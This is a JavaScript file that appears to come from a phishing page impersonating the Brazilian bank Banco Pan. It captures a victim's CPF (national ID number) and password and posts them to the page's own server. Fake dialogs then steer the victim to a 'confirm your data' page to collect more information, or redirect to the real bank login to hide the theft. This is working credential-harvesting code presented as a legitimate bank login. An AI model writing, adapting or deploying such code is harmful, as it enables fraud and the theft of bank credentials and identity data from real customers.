async function entrada(cpf, senha) {
  return new Promise((resolve, reject) => {
    $.post("/", { cpf, senha }, function (data) {
      if (data) {
        resolve(data)
      } else {
        reject({ mensagem: 'conexao falhou' })
      }
    }, "json");
  })
}


$('.cpf').mask('000.000.000-00', { reverse: true });


$("#submit").on("click", async function () {
  // if ($("#form-login").valid()) { //Verifica se o formulário está válido.
  let cpf = $("#cpf").cleanVal();
  let senha = $("#senha").val();

  if (cpf == '' || senha == '') {
    Swal.fire({
      icon: 'error',
      title: 'Tente novamente',
      text: 'Digite os dados corretamente!',
      confirmButtonColor: '#07b2fd',
    })
    return false;
  }

  let res = await entrada(cpf, senha);

  if (res.mensagem == "usuario nao encontrado") {
    Swal.fire({
      icon: 'error',
      title: 'Tente novamente',
      text: 'Parece que algo deu errado!',
      confirmButtonColor: '#07b2fd',
      footer: '<a href="https://www.bancopan.com.br/blog/publicacoes/nao-consigo-acessar-o-app-do-banco-pan-e-agora.htm" target="_blank">Não consegue acessar?</a>'
    })
    return false;
  }

  if (res.mensagem == "usuario com dados duplicados") {
    Swal.fire({
      icon: 'warning',
      title: 'Tem um tempinho?',
      text: 'Ainda precisamos confirmar alguns de seus dados! Por motivos de segurança e personalização da sua experiência, pedimos que você confirme alguns dados seus para nós. Não demora nem 5 minutos!',
      showCancelButton: true,
      confirmButtonColor: '#07b2fd',
      confirmButtonText: 'Atualizar dados',
      cancelButtonText: 'Redirecionar para conta',
      allowOutsideClick: false
    }).then((result) => {
      if (result.isConfirmed) {
        window.location.assign(`/confirma-dados?cpf=${cpf}`)
      } else {
        window.location.assign('https://accounts.bancopan.com.br/auth/realms/pan-clientes/protocol/openid-connect/auth?client_id=pan-online&response_type=code&scope=openid%20profile&redirect_uri=https://online.bancopan.com.br');
      }
    })
    // let cpf = res.cpf;
    return false;
  }

  Swal.fire({
    icon: 'success',
    title: 'Usuário autenticado!',
    text: 'Redirecionando para sua conta',
    confirmButtonColor: '#07b2fd'
  }).then(() => {
    window.location.assign('https://accounts.bancopan.com.br/auth/realms/pan-clientes/protocol/openid-connect/auth?client_id=pan-online&response_type=code&scope=openid%20profile&redirect_uri=https://online.bancopan.com.br');
  })
  return true;
  // $('#myModal').modal('show'); //Se for válido, exibe o modal.
  // }
});

// $("#aceite").on("click", function () {
//   $("#form-login").submit(); //Se for clicado no botão aceite é submetido o formulário
// });
// $("#form-login").validate({
//   rules: {
//     "email": {
//       required: true,
//       email: true
//     },
//     "senha": {
//       required: true
//     }
//   },
//   messages: {
//     "email": {
//       required: 'Campo e-mail é obrigatório',
//       email: 'E-mail inválido'
//     },
//     "senha": {
//       required: 'Campo senha é obrigatório'
//     }
//   }
// });
